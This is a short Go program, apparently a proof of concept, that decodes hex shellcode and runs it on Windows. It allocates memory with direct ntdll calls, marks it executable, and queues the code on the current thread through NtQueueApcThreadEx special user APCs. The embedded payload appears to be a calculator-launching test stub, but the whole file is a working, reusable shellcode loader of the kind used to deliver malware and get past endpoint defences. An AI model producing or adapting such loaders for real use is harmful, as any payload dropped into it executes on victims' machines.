package main

//Inspired from :
//https://github.com/C-Sto/BananaPhone/blob/master/example/calcshellcode/main.go
//https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/NtQueueApcThreadEx-Local/main.go

import (
	"encoding/hex"
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"unsafe"
)

// https://docs.microsoft.com/en-us/windows/win32/midl/enum
const (
	QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC = 1
)

//Inspired from : https://github.com/C-Sto/BananaPhone/blob/master/example/calcshellcode/main.go

func main() {
	shellcode, _ := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
	ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
	NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")

	var baseA uintptr
	var handle = uintptr(0xffffffffffffffff)
	var oldprotect uintptr

	shellcodeSize := uintptr(len(shellcode))

	//https://www.pinvoke.net/default.aspx/ntdll.NtAllocateVirtualMemory
	_, _, err := ntAllocateVirtualMemory.Call( //NtAllocateVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&shellcodeSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err.Error() != "The operation completed successfully." {
		log.Fatal("Error calling ntAllocateVirtualMemory:", err)
	}
	memcpy(baseA, shellcode)

	//https://www.pinvoke.net/default.aspx/ntdll.NtProtectVirtualMemory
	_, _, err = ntProtectVirtualMemory.Call( //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&shellcodeSize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if err.Error() != "The operation completed successfully." {
		log.Fatal("Error calling ntProtectVirtualMemory:", err)
	}

	thread := windows.CurrentThread()

	//http://www.pinvoke.net/default.aspx/ntdll/NtQueueApcThreadEx.html?diff=y
	_, _, err = NtQueueApcThreadEx.Call(
		uintptr(thread),
		QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
		baseA,
		0,
		0,
		0,
	)
	if err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling NtQueueApcThreadEx:\n%s", err))
	}
}

// memcpy in golang from https://github.com/timwhitez/Doge-Gabh/blob/main/example/shellcodecalc/calc.go
func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}
